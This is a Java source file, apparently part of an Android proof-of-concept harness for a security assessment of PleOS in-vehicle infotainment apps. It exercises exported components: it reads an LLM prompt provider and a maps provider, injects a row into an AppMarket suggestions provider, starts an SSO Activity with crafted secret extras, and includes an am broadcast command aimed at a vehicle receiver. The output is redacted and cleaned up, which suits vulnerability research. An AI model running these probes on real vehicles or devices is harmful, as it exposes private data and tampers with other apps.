        out.append("[map-1] exported maps provider\n");
        out.append(runMapQuerySummary()).append("\n\n");
        out.append("[vc-6] receiver trigger\n");
        out.append("host Frida dry-run evidence recorded separately\n");
        out.append("status: runtime trigger confirmed without DB mutation\n\n");
        out.append("No prompt, credential, token, or PII literal is displayed.\n");
        view.setText(out.toString());
        result("finding=showcase displayed=true");
    }

    private void showInstallAssumption() {
        boolean isSystem = (getApplicationInfo().flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
        renderScenario(
                "00",
                "Threat Model: Same-device App",
                "Attacker can already install or run an ordinary app on the IVI/emulator.",
                "adb install org.codex.pleos.poc, then launch scenario Activity.",
                "Install is only the starting condition, not the exploit.",
                "package=" + getPackageName()
                        + "\napp_is_system=" + isSystem
                        + "\nmarker=" + MARKER
                        + "\nThis harness has no PleOS signing key.",
                "same-device malicious app threat model",
                "Same-device app can exercise exported component boundaries.",
                "Limitation: no remote install, no persistence, no vehicle takeover.");
    }

    private void showLmp1() {
        FindingResult finding = collectPromptProvider();
        renderScenario(
                "lmp-1",
                "Prompt Provider Disclosure",
                "Same-device untrusted app can call exported ContentProvider.",
                "ContentResolver.query(content://ai.pleos.playground.llm.model.provider.prompts/)",
                "SecurityException or permission_denial=true.",
                finding.observed,
                finding.preview,
                "LLM prompt/corpus raw provider read path is runtime confirmed.",
                "Limitation: raw prompt text is redacted; no jailbreak or remote compromise is demonstrated.");
    }

    private void showMap1() {
        FindingResult finding = collectMapProvider();
        renderScenario(
                "map-1",
                "Maps Provider Reachability",
                "Same-device untrusted app can query exported Maps provider.",
                "ContentResolver.query(..., selectionArgs=[\"" + MARKER + "\"])",
                "SecurityException or provider permission denial.",
                finding.observed,
                finding.preview,
                "Provider boundary is reachable. Populated rows could expose search/navigation context.",
                "Limitation: current emulator state returned no data rows, so disclosure is unconfirmed.");
    }

    private void showAcc4() {
        String observed = extra("observed", "pending: host script has not launched SsoActivity yet");
        renderScenario(
                "acc-4",
                "SSO Activity Secret Extra Boundary",
                "Same-device untrusted app can start an exported Activity.",
                "startActivity(ai.pleos.playground.account/.login.SsoActivity) with benign user-client-secret extra.",
                "Activity should reject untrusted caller or require signature permission.",
                observed,
                extra("preview", "marker value is benign and redacted by hash only"),
                "SSO client parameter injection surface; attacker-supplied benign params cross the exported boundary.",
                "Limitation: runtime secret leak is not confirmed; no OAuth/backend abuse is attempted.");
    }

    private void showAm1() {
        FindingResult finding = collectAm1Suggestion();
        renderScenario(
                "am-1",
                "AppMarket Suggestions Provider Write",
                "Same-device untrusted app can access exported Suggestions provider.",
                "Snapshot-protected ContentResolver.bulkInsert() with harmless marker row.",
                "Provider should deny untrusted writes or require signature permission.",
                finding.observed,
                finding.preview,
                "Suggestion provider write primitive is confirmed when insert succeeds.",
                "Limitation: user-visible UI impact is confirmed only if the marker appears in AppMarket/global search.");
    }

    private void showVc6() {
        renderScenario(
                "vc-6",
                "Vehicle Receiver Trigger Dry-run",
                "Same-device untrusted app or shell can send explicit broadcast.",
                "am broadcast -n ai.umos.vehiclecontrol/...VehicleBroadcastReceiver --es macAddress 02:00:00:00:00:01",
                "Receiver should be internal-only or require caller signature permission.",
                extra("observed", "pending: host script has not sent broadcast yet"),
                extra("preview", "Frida hook blocks original onReceive, so DB mutation is prevented."),
                extra("impact", "Vehicle-related receiver processing path is externally reachable."),
                extra("limitation", "Limitation: vehicle-control-adjacent only; no vehicle actuation or safety-critical impact."));
    }

    private void showStaticCreds() {
        renderScenario(
                "static-credentials",
                "Static Credential Extraction",
                "Attacker can obtain the APK from device image or emulator.",
                "apk pull/decompile/grep for production call sites and OAuth constants.",
                "Production secrets should not be present in client APK code.",
                extra("observed", "amb-1: LLM API key-shaped value in production call path; am-3: OAuth client_secret-shaped value in AppMarket/account domain."),
                extra("preview", "secret literals are never shown: prefix/length/hash/call path only."),
                "APK reverse alone can expose client-side secret material.",
                "Limitation: live API abuse, token validation, and backend acceptance are not tested.");
    }

    private void showSummary() {
        renderScenario(
                "summary",
                "Impact Statement",
                "Same-device app threat model; all tests are emulator-only.",
                "PoC harness queries providers, sends benign broadcasts, and starts exported activities.",
                "Exported components should enforce signature permissions, caller validation, or private scope.",
                extra("observed", "lmp-1=provider_read_confirmed\nvc-6=receiver_reachability_confirmed\nam-1=write_primitive_confirmed\nacc-4=parameter_boundary_reachable\nstatic=offline_exposure_only"),
                "raw sensitive content redacted; logs store hashes, counts, booleans, and row diffs only",
                "These primitives can contribute to an IVI compromise chain under a same-device app assumption.",
                "Limitation: full vehicle takeover is not demonstrated.");
    }

    private void showImprovedCard() {
        renderCard(
                extra("kicker", "PoC Impact Demo"),
                extra("title", "Boundary Card"),
                extra("body", "No card body provided."),
                extra("footer", "emulator-only / redacted evidence"));
    }

    private void showImprovedLmp1Identity() {
        boolean isSystem = (getApplicationInfo().flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0;
        int requestedPermissionCount = 0;
        try {
            PackageInfo info = getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_PERMISSIONS);
            requestedPermissionCount = info.requestedPermissions == null ? 0 : info.requestedPermissions.length;
        } catch (Throwable ignored) {
            requestedPermissionCount = -1;
        }
        renderCard(
                "STEP 1 / ATTACKER APP IDENTITY",
                "Untrusted same-device app",
                "Package: " + getPackageName()
                        + "\nUID: " + getApplicationInfo().uid
                        + "\nis_system=" + isSystem
                        + "\nrequested_permissions=" + requestedPermissionCount
                        + "\nNo PleOS signing key is available to this harness.",
                "Install is a threat-model precondition, not the exploit.");
    }

    private void showImprovedLmp1Result() {
        FindingResult finding = collectPromptProvider();
        result("finding=lmp-1 improved_result " + finding.observed.replace('\n', ' '));
        renderCard(
                "STEP 4 / EXPECTED VS OBSERVED",
                "Prompt provider access was not denied",
                "Expected:\npermission_denied=true or SecurityException\n\nObserved:\n" + finding.observed,
                "Raw prompt/corpus text is not displayed.");
    }

    private void showImprovedLmp1Artifact() {
        FindingResult finding = collectPromptProvider();
        result("finding=lmp-1 improved_artifact " + finding.observed.replace('\n', ' '));
        renderCard(
                "STEP 5 / REDACTED EVIDENCE BUNDLE",
                "prompt_corpus_bundle.redacted.json",
                "raw_text=false"
                        + "\nsensitive_content_redacted=true"
                        + "\n" + finding.observed
                        + "\n\nPreview:\n" + finding.preview,
                "Attacker app obtained a redacted artifact, not raw text.");
    }

    private void showImprovedAm1Result() {
        FindingResult finding = collectAm1Suggestion();
        result("finding=am-1 improved_result " + finding.observed.replace('\n', ' '));
        renderCard(
                "ADDITIONAL PRIMITIVE / am-1",
                "AppMarket suggestion provider write",
                "Observed:\n" + finding.observed
                        + "\n\nClaim:\nwrite accepted if inserted=1; UI impact only if marker is visible.",
                "Not claimed: no install hijack, no live store abuse.");
    }

    private void runLmp1BoundaryProbe() {
        FindingResult finding = collectPromptProvider();
        result("finding=lmp-1 boundary_probe " + finding.observed.replace('\n', ' ')
                + " preview_hash=" + sha256(finding.preview).substring(0, 16));
    }

    private static final class FindingResult {
        final String observed;
        final String preview;

        FindingResult(String observed, String preview) {
            this.observed = observed;
            this.preview = preview;
        }
    }

    private void renderScenario(String id, String title, String assumption, String trigger,
                                String expected, String observed, String preview,
                                String impact, String notClaimed) {
        TextView view = new TextView(this);
        view.setTextSize(16);
        view.setTypeface(Typeface.MONOSPACE);
        view.setGravity(Gravity.START);
        view.setPadding(28, 28, 28, 28);
        view.setText(
                "PleOS Runtime PoC\n"
                        + "Scenario " + id + ": " + title + "\n"
                        + "emulator-only / redacted evidence\n\n"
                        + "Assumption\n" + assumption + "\n\n"
                        + "Trigger\n" + trigger + "\n\n"
                        + "Expected\n" + expected + "\n\n"
                        + "Observed\n" + observed + "\n\n"
                        + "Evidence preview\n" + preview + "\n\n"
                        + "Impact\n" + impact + "\n\n"
                        + notClaimed + "\n"
        );
        ScrollView scrollView = new ScrollView(this);
        scrollView.addView(view);
        setContentView(scrollView);
        result("finding=" + id + " showcase_displayed=true");
    }

    private void renderCard(String kicker, String title, String body, String footer) {
        TextView view = new TextView(this);
        view.setTextSize(20);
        view.setTypeface(Typeface.MONOSPACE);
        view.setGravity(Gravity.START);
        view.setPadding(34, 42, 34, 34);
        view.setText(
                kicker + "\n\n"
                        + title + "\n"
                        + "--------------------------------\n\n"
                        + body + "\n\n"
                        + footer + "\n"
        );
        ScrollView scrollView = new ScrollView(this);
        scrollView.addView(view);
        setContentView(scrollView);
        showOverlayCard(kicker, title, body, footer);
        result("finding=improved_card title_hash=" + sha256(title).substring(0, 16));
    }

    private void showOverlayCard(String kicker, String title, String body, String footer) {
        try {
            removeOverlayCard();
            TextView view = new TextView(this);
            view.setTextColor(Color.rgb(17, 24, 39));
            view.setTextSize(30);
            view.setTypeface(Typeface.MONOSPACE);
            view.setGravity(Gravity.START);
            view.setLineSpacing(6.0f, 1.0f);
            view.setPadding(86, 78, 86, 78);
            view.setText(
                    kicker + "\n\n"
                            + title + "\n"
                            + "========================================\n\n"
                            + body + "\n\n"
                            + footer + "\n");

            ScrollView scrollView = new ScrollView(this);
            scrollView.setFillViewport(true);
            scrollView.setBackgroundColor(0xF7FFFFFF);
            scrollView.addView(view);

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                            | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                            | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT);
            params.gravity = Gravity.TOP | Gravity.START;
            ((WindowManager) getSystemService(WINDOW_SERVICE)).addView(scrollView, params);
            overlayView = scrollView;
        } catch (Throwable t) {
            result("finding=improved_overlay exception_class=" + t.getClass().getName()
                    + " message_hash=" + sha256(t.getMessage()));
        }
    }

    private void removeOverlayCard() {
        if (overlayView == null) {
            return;
        }
        try {
            ((WindowManager) getSystemService(WINDOW_SERVICE)).removeView(overlayView);
        } catch (Throwable ignored) {
            // The overlay may already have been removed with the Activity token.
        }
        overlayView = null;
    }

    private FindingResult collectPromptProvider() {
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse("content://ai.pleos.playground.llm.model.provider.prompts/");
            cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor == null) {
                return new FindingResult("permission_denial=false\ncursor_null=true\nrows=-1", "no cursor returned");
            }
            int rows = 0;
            int chars = 0;
            String[] columns = cursor.getColumnNames();
            StringBuilder digestInput = new StringBuilder(joinColumns(columns));
            StringBuilder preview = new StringBuilder();
            while (cursor.moveToNext()) {
                rows++;
                if (rows == 1) {
                    preview.append("first row shape:\n");
                }
                for (int i = 0; i < columns.length; i++) {
                    String value = cursor.getString(i);
                    if (value != null) {
                        chars += value.length();
                        digestInput.append('|').append(value);
                    }
                    if (rows == 1 && i < 3) {
                        preview.append(columns[i]).append("=")
                                .append(redactForPreview(value)).append("\n");
                    }
                }
            }
            String sha = sha256(digestInput.toString());
            return new FindingResult(
                    "permission_denial=false\ncursor_null=false\nrows=" + rows
                            + "\nchars=" + chars
                            + "\nsha256_short=" + sha.substring(0, 16),
                    preview.length() == 0 ? "no row preview" : preview.toString().trim()
            );
        } catch (SecurityException se) {
            return new FindingResult("permission_denial=true\nexception=" + se.getClass().getSimpleName(),
                    "message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            return new FindingResult("permission_denial=false\nexception=" + t.getClass().getSimpleName(),
                    "message_hash=" + sha256(t.getMessage()));
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private FindingResult collectMapProvider() {
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse("content://ai.umos.maps.android.navigation.app/search_suggest_query");
            cursor = getContentResolver().query(uri, null, null, new String[]{MARKER}, null);
            if (cursor == null) {
                return new FindingResult("permission_denial=false\ncursor_null=true\nrows=-1", "no cursor returned");
            }
            int rows = 0;
            String[] columns = cursor.getColumnNames();
            StringBuilder preview = new StringBuilder();
            while (cursor.moveToNext()) {
                rows++;
                if (rows == 1) {
                    preview.append("first returned row:\n");
                    for (int i = 0; i < columns.length && i < 5; i++) {
                        preview.append(columns[i]).append("=")
                                .append(redactForPreview(cursor.getString(i))).append("\n");
                    }
                }
            }
            return new FindingResult(
                    "permission_denial=false\ncursor_null=false\nrows=" + rows
                            + "\ncolumns=" + columns.length
                            + "\ncolumn_hash=" + sha256(joinColumns(columns)),
                    rows == 0 ? "row_count=0; provider reachable but no data returned for marker" : preview.toString().trim()
            );
        } catch (SecurityException se) {
            return new FindingResult("permission_denial=true\nexception=" + se.getClass().getSimpleName(),
                    "message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            return new FindingResult("permission_denial=false\nexception=" + t.getClass().getSimpleName(),
                    "message_hash=" + sha256(t.getMessage()));
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private FindingResult collectAm1Suggestion() {
        Cursor cursor = null;
        try {
            ContentResolver resolver = getContentResolver();
            String marker = extra("marker", MARKER);
            String packageName = extra("am1_package_name", "org.codex.safe.marker.notinstalled");
            Uri baseUri = Uri.parse("content://ai.umos.appmarket.globalsearch.Suggestions");
            ContentValues row = buildAm1Row(marker, packageName);
            int inserted = resolver.bulkInsert(baseUri, new ContentValues[]{row});
            cursor = resolver.query(Uri.parse("content://ai.umos.appmarket.globalsearch.Suggestions/" + Uri.encode(marker)),
                    null, null, null, null);

            int rows = 0;
            boolean markerSeen = false;
            int columnCount = 0;
            String columnHash = sha256("");
            StringBuilder preview = new StringBuilder();
            if (cursor != null) {
                String[] columns = cursor.getColumnNames();
                columnCount = columns.length;
                columnHash = sha256(joinColumns(columns));
                while (cursor.moveToNext()) {
                    rows++;
                    if (rows == 1) {
                        preview.append("first returned row:\n");
                    }
                    for (int i = 0; i < columns.length; i++) {
                        String value = cursor.getString(i);
                        if (marker.equals(value)) {
                            markerSeen = true;
                        }
                        if (rows == 1 && i < 5) {
                            preview.append(columns[i]).append("=")
                                    .append(redactForPreview(value)).append("\n");
                        }
                    }
                }
            } else {
                rows = -1;
            }
            return new FindingResult(
                    "permission_denial=false\ninserted=" + inserted
                            + "\ncursor_null=" + (cursor == null)
                            + "\nrows=" + rows
                            + "\nmarker_seen=" + markerSeen
                            + "\ncolumns=" + columnCount
                            + "\ncolumn_hash=" + columnHash,
                    preview.length() == 0 ? "write accepted; no marker row returned" : preview.toString().trim()
            );
        } catch (SecurityException se) {
            return new FindingResult("permission_denial=true\nexception=" + se.getClass().getSimpleName(),
                    "message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            return new FindingResult("permission_denial=false\nexception=" + t.getClass().getSimpleName(),
                    "message_hash=" + sha256(t.getMessage()));
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private String extra(String key, String fallback) {
        try {
            String encoded = getIntent() == null ? null : getIntent().getStringExtra(key + "_b64");
            if (encoded != null && encoded.length() > 0) {
                byte[] bytes = Base64.decode(encoded, Base64.NO_WRAP);
                return new String(bytes, StandardCharsets.UTF_8).replace("\\n", "\n");
            }
            String value = getIntent() == null ? null : getIntent().getStringExtra(key);
            if (value == null || value.length() == 0) {
                return fallback;
            }
            return value.replace("\\n", "\n");
        } catch (Throwable t) {
            return fallback;
        }
    }

    private String runPromptProviderSummary() {
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse("content://ai.pleos.playground.llm.model.provider.prompts/");
            cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor == null) {
                return "permission_denial=false cursor_null=true";
            }
            int rows = 0;
            int chars = 0;
            StringBuilder digestInput = new StringBuilder();
            String[] columns = cursor.getColumnNames();
            digestInput.append(joinColumns(columns));
            while (cursor.moveToNext()) {
                rows++;
                for (int i = 0; i < columns.length; i++) {
                    String value = cursor.getString(i);
                    if (value != null) {
                        chars += value.length();
                        digestInput.append('|').append(value);
                    }
                }
            }
            return "permission_denial=false rows=" + rows
                    + "\nchars=" + chars
                    + "\nsha256=" + sha256(digestInput.toString()).substring(0, 16) + "...";
        } catch (SecurityException se) {
            return "permission_denial=true exception=" + se.getClass().getSimpleName();
        } catch (Throwable t) {
            return "permission_denial=false exception=" + t.getClass().getSimpleName()
                    + " message_hash=" + sha256(t.getMessage()).substring(0, 16) + "...";
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private String runMapQuerySummary() {
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse("content://ai.umos.maps.android.navigation.app/search_suggest_query");
            cursor = getContentResolver().query(uri, null, null, new String[]{MARKER}, null);
            if (cursor == null) {
                return "permission_denial=false cursor_null=true rows=-1";
            }
            int rows = 0;
            while (cursor.moveToNext()) {
                rows++;
            }
            String[] columns = cursor.getColumnNames();
            return "permission_denial=false cursor_null=false"
                    + "\nrows=" + rows
                    + "\ncolumns=" + columns.length
                    + "\ncolumn_hash=" + sha256(joinColumns(columns)).substring(0, 16) + "...";
        } catch (SecurityException se) {
            return "permission_denial=true exception=" + se.getClass().getSimpleName();
        } catch (Throwable t) {
            return "permission_denial=false exception=" + t.getClass().getSimpleName()
                    + " message_hash=" + sha256(t.getMessage()).substring(0, 16) + "...";
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void runMapQuery() {
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse("content://ai.umos.maps.android.navigation.app/search_suggest_query");
            cursor = getContentResolver().query(uri, null, null, new String[]{MARKER}, null);
            if (cursor == null) {
                result("finding=map-1 permission_denial=false cursor_null=true row_count=-1 column_count=0 column_hash=" + sha256(""));
                return;
            }
            int rows = 0;
            while (cursor.moveToNext()) {
                rows++;
            }
            String[] columns = cursor.getColumnNames();
            result("finding=map-1 permission_denial=false cursor_null=false row_count=" + rows
                    + " column_count=" + columns.length
                    + " column_hash=" + sha256(joinColumns(columns)));
        } catch (SecurityException se) {
            result("finding=map-1 permission_denial=true exception_class=" + se.getClass().getName()
                    + " message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            result("finding=map-1 permission_denial=false exception_class=" + t.getClass().getName()
                    + " message_hash=" + sha256(t.getMessage()));
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void runAcc4Start() {
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(
                    "ai.pleos.playground.account",
                    "ai.pleos.playground.account.login.SsoActivity"));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("user-client-id", "codex-client-id");
            intent.putExtra("user-client-secret", MARKER);
            intent.putExtra("user-client-name", "codex-client-name");
            startActivity(intent);
            result("finding=acc-4 launch_result=started marker_hash=" + sha256(MARKER));
        } catch (SecurityException se) {
            result("finding=acc-4 launch_result=security_exception exception_class=" + se.getClass().getName()
                    + " message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            result("finding=acc-4 launch_result=exception exception_class=" + t.getClass().getName()
                    + " message_hash=" + sha256(t.getMessage()));
        }
    }

    private void runAm1Suggestion() {
        Cursor cursor = null;
        try {
            ContentResolver resolver = getContentResolver();
            String marker = extra("marker", MARKER);
            String packageName = extra("am1_package_name", "org.codex.safe.marker.notinstalled");
            Uri baseUri = Uri.parse("content://ai.umos.appmarket.globalsearch.Suggestions");
            ContentValues row = buildAm1Row(marker, packageName);
            int inserted = resolver.bulkInsert(baseUri, new ContentValues[]{row});
            cursor = resolver.query(Uri.parse("content://ai.umos.appmarket.globalsearch.Suggestions/" + Uri.encode(marker)),
                    null, null, null, null);
            int rows = 0;
            boolean markerSeen = false;
            int columnCount = 0;
            String columnHash = sha256("");
            if (cursor != null) {
                String[] columns = cursor.getColumnNames();
                columnCount = columns.length;
                columnHash = sha256(joinColumns(columns));
                while (cursor.moveToNext()) {
                    rows++;
                    for (int i = 0; i < columns.length; i++) {
                        String value = cursor.getString(i);
                        if (marker.equals(value)) {
                            markerSeen = true;
                        }
                    }
                }
            } else {
                rows = -1;
            }
            result("finding=am-1 permission_denial=false inserted=" + inserted
                    + " marker=" + marker
                    + " package_name=" + packageName
                    + " cursor_null=" + (cursor == null)
                    + " row_count=" + rows
                    + " marker_seen=" + markerSeen
                    + " column_count=" + columnCount
                    + " column_hash=" + columnHash);
        } catch (SecurityException se) {
            result("finding=am-1 permission_denial=true exception_class=" + se.getClass().getName()
                    + " message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            result("finding=am-1 permission_denial=false exception_class=" + t.getClass().getName()
                    + " message_hash=" + sha256(t.getMessage()));
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private void runAm1EvidenceProbe() {
        try {
            ContentResolver resolver = getContentResolver();
            String marker = extra("marker", MARKER);
            String packageName = extra("am1_package_name", "org.codex.safe.marker.notinstalled");
            Uri baseUri = Uri.parse("content://ai.umos.appmarket.globalsearch.Suggestions");

            Am1QueryState pre = queryAm1Marker(resolver, marker);
            int inserted = resolver.bulkInsert(baseUri, new ContentValues[]{buildAm1Row(marker, packageName)});
            Am1QueryState post = queryAm1Marker(resolver, marker);
            int cleanupReturn = resolver.bulkInsert(baseUri, new ContentValues[0]);
            Am1QueryState cleanup = queryAm1Marker(resolver, marker);
            boolean l2Confirmed = inserted >= 1 && post.markerSeen && post.rows >= 1;
            boolean cleanupOk = !cleanup.markerSeen && cleanup.rows == 0;

            result("finding=am-1 evidence_probe permission_denial=false"
                    + " marker=" + marker
                    + " marker_hash=" + sha256(marker)
                    + " package_name=" + packageName
                    + " pre_cursor_null=" + pre.cursorNull
                    + " pre_row_count=" + pre.rows
                    + " pre_marker_seen=" + pre.markerSeen
                    + " inserted=" + inserted
                    + " post_cursor_null=" + post.cursorNull
                    + " post_row_count=" + post.rows
                    + " post_marker_seen=" + post.markerSeen
                    + " post_column_count=" + post.columnCount
                    + " post_column_hash=" + post.columnHash
                    + " cleanup_return=" + cleanupReturn
                    + " cleanup_cursor_null=" + cleanup.cursorNull
                    + " cleanup_row_count=" + cleanup.rows
                    + " cleanup_marker_seen=" + cleanup.markerSeen
                    + " cleanup_ok=" + cleanupOk
                    + " l2_provider_write_confirmed=" + l2Confirmed
                    + " l3_ui_impact_confirmed=false");
        } catch (SecurityException se) {
            result("finding=am-1 evidence_probe permission_denial=true exception_class="
                    + se.getClass().getName() + " message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            result("finding=am-1 evidence_probe permission_denial=false exception_class="
                    + t.getClass().getName() + " message_hash=" + sha256(t.getMessage()));
        }
    }

    private void runAm1Cleanup() {
        try {
            ContentResolver resolver = getContentResolver();
            String marker = extra("marker", MARKER);
            Uri baseUri = Uri.parse("content://ai.umos.appmarket.globalsearch.Suggestions");
            int cleanupReturn = resolver.bulkInsert(baseUri, new ContentValues[0]);
            Am1QueryState cleanup = queryAm1Marker(resolver, marker);
            result("finding=am-1 cleanup permission_denial=false"
                    + " marker=" + marker
                    + " cleanup_return=" + cleanupReturn
                    + " cleanup_cursor_null=" + cleanup.cursorNull
                    + " cleanup_row_count=" + cleanup.rows
                    + " cleanup_marker_seen=" + cleanup.markerSeen
                    + " cleanup_ok=" + (!cleanup.markerSeen && cleanup.rows == 0));
        } catch (SecurityException se) {
            result("finding=am-1 cleanup permission_denial=true exception_class="
                    + se.getClass().getName() + " message_hash=" + sha256(se.getMessage()));
        } catch (Throwable t) {
            result("finding=am-1 cleanup permission_denial=false exception_class="
                    + t.getClass().getName() + " message_hash=" + sha256(t.getMessage()));
        }
    }

    private ContentValues buildAm1Row(String marker, String packageName) {
        ContentValues row = new ContentValues();
        row.put("package_name", packageName);
        row.put("suggest_icon_1", "0");
        row.put("suggest_text_1", marker);
        row.put("suggest_text_2", "safe_marker");
        row.put("__umos_button_text", "open");
        row.put("__umos_button_background", "none");
        row.put("suggest_intent_data", "market://detail?contentId=codex-safe-marker");
        row.put("__umos_button_intent_uri", "market://detail?contentId=codex-safe-marker&action=view");
        return row;
    }

    private Am1QueryState queryAm1Marker(ContentResolver resolver, String marker) {
        Cursor cursor = null;
        Am1QueryState state = new Am1QueryState();
        try {
            cursor = resolver.query(Uri.parse("content://ai.umos.appmarket.globalsearch.Suggestions/" + Uri.encode(marker)),
                    null, null, null, null);
            state.cursorNull = cursor == null;
            if (cursor == null) {
                state.rows = -1;
                state.columnHash = sha256("");
                return state;
            }
            String[] columns = cursor.getColumnNames();
            state.columnCount = columns.length;
            state.columnHash = sha256(joinColumns(columns));
            while (cursor.moveToNext()) {
                state.rows++;
                for (int i = 0; i < columns.length; i++) {
                    if (marker.equals(cursor.getString(i))) {
                        state.markerSeen = true;
                    }
                }
            }
            return state;
        } catch (Throwable t) {
            state.cursorNull = true;
            state.rows = -1;
            state.columnHash = sha256(t.getClass().getName());
            return state;
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    private static final class Am1QueryState {
        boolean cursorNull = true;
        int rows = 0;
        boolean markerSeen = false;
        int columnCount = 0;
        String columnHash = "";
    }

    private static String joinColumns(String[] columns) {
        StringBuilder builder = new StringBuilder();
        for (int i = 0; i < columns.length; i++) {
            if (i > 0) {
                builder.append("|");
            }
            builder.append(columns[i]);
        }
        return builder.toString();
    }

    private static String redactForPreview(String value) {
        if (value == null) {
            return "<null>";
        }
        String redacted = redactJsonish(value);
        redacted = redacted.replaceAll("sk-[A-Za-z0-9_\\-]{6,}", "sk-<redacted>");
        redacted = redacted.replaceAll("(?i)bearer\\s+[A-Za-z0-9._\\-]{8,}", "Bearer <redacted>");
        redacted = redacted.replaceAll("[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}", "<email-redacted>");
        redacted = redacted.replaceAll("01[0-9][- ]?[0-9]{3,4}[- ]?[0-9]{4}", "<phone-redacted>");
        if (redacted.length() > 520) {
            redacted = redacted.substring(0, 520) + "...<truncated len=" + value.length()
                    + " sha16=" + sha256(value).substring(0, 16) + ">";
        }
        return redacted.replace('\n', ' ').replace('\r', ' ');
    }

    private static String redactJsonish(String input) {
        StringBuilder out = new StringBuilder();
        int i = 0;
        while (i < input.length()) {
            char c = input.charAt(i);
            if (c != '"') {
                out.append(c);
                i++;
                continue;
            }
            int j = i + 1;
            boolean escaped = false;
            StringBuilder token = new StringBuilder();
            while (j < input.length()) {
                char ch = input.charAt(j);
                if (escaped) {
                    token.append(ch);
                    escaped = false;
                } else if (ch == '\\') {
                    token.append(ch);
                    escaped = true;
                } else if (ch == '"') {
                    break;
                } else {
                    token.append(ch);
                }
                j++;
            }
            if (j >= input.length()) {
                out.append(input.substring(i));
                break;
            }
            int k = j + 1;
            while (k < input.length() && Character.isWhitespace(input.charAt(k))) {
                k++;
            }
            int p = i - 1;
            while (p >= 0 && Character.isWhitespace(input.charAt(p))) {
                p--;
            }
            boolean isKey = k < input.length() && input.charAt(k) == ':';
            boolean isValue = p >= 0 && input.charAt(p) == ':';
            String tokenValue = token.toString();
            if (isKey || (!isValue && tokenValue.length() <= 12)) {
                out.append('"').append(tokenValue).append('"');
            } else if (tokenValue.length() <= 12 && !looksSensitive(tokenValue)) {
                out.append('"').append(tokenValue).append('"');
            } else {
                out.append("\"<redacted len=").append(tokenValue.length())
                        .append(" sha16=").append(sha256(tokenValue).substring(0, 16)).append(">\"");
            }
            i = j + 1;
        }
        return out.toString();
    }

    private static boolean looksSensitive(String value) {
        String lower = value.toLowerCase();
        return lower.startsWith("sk-")
                || lower.contains("secret")
                || lower.contains("token")
                || lower.contains("bearer")
                || value.length() > 64;
    }

    private static String sha256(String value) {
        try {
            if (value == null) {
                value = "";
            }
            MessageDigest digest = MessageDigest.getInstance("SHA-256");
            byte[] bytes = digest.digest(value.getBytes(StandardCharsets.UTF_8));
            StringBuilder builder = new StringBuilder();
            for (byte b : bytes) {
                builder.append(String.format("%02x", b));
            }
            return builder.toString();
        } catch (Throwable t) {
            return "sha256_error";
        }
    }

    private static String safeToken(String value) {
        if (value == null) {
            return "null";
        }
        return value.replaceAll("[^A-Za-z0-9_./:-]", "_");
    }

    private static String previewToken(String value) {
        String token = safeToken(value);
        if (token.length() > 80) {
            return token.substring(0, 80);
        }
        return token;
    }

    private static void result(String line) {
        Log.i(TAG, "RESULT " + line);
    }
}

final class ChainNaviRouteStep implements Runnable {
    private final PocActivity host;
    private final String payload;

    ChainNaviRouteStep(PocActivity host, String payload) {
        this.host = host;
        this.payload = payload;
    }

    @Override
    public void run() {
        host.runNaviRouteFromChainStep(payload);
    }
}

final class ChainVehicleStep implements Runnable {
    private final PocActivity host;

    ChainVehicleStep(PocActivity host) {
        this.host = host;
    }

    @Override
    public void run() {
        host.runVehicleFromChainStep();
    }
}

final class VehicleCallbackResult {
    final String label;
    boolean done = false;
    boolean success = false;
    boolean transactReturn = false;
    String propKey = "";
    int areaOrType = 0;
    String value = "";
    String error = "";

    VehicleCallbackResult(String label) {
        this.label = label;
    }

    synchronized void markSuccess(String propKey, int areaOrType, String value) {
        this.success = true;
        this.done = true;
        this.propKey = propKey == null ? "" : propKey;
        this.areaOrType = areaOrType;
        this.value = value == null ? "" : value;
        notifyAll();
    }

    synchronized void markError(String propKey, int areaOrType, String error) {
        this.success = false;
        this.done = true;
        this.propKey = propKey == null ? "" : propKey;
        this.areaOrType = areaOrType;
        this.error = error == null ? "" : error;
        notifyAll();
    }

    synchronized void await(long timeoutMs) {
        if (done) {
            return;
        }
        try {
            wait(timeoutMs);
        } catch (InterruptedException ignored) {
        }
        if (!done && error.length() == 0) {
            error = "callback_timeout";
        }
    }
}

final class VehicleProbeTimeout implements Runnable {
    private final PocActivity host;

    VehicleProbeTimeout(PocActivity host) {
        this.host = host;
    }

    @Override
    public void run() {
        host.onVehicleProbeTimeout();
    }
}

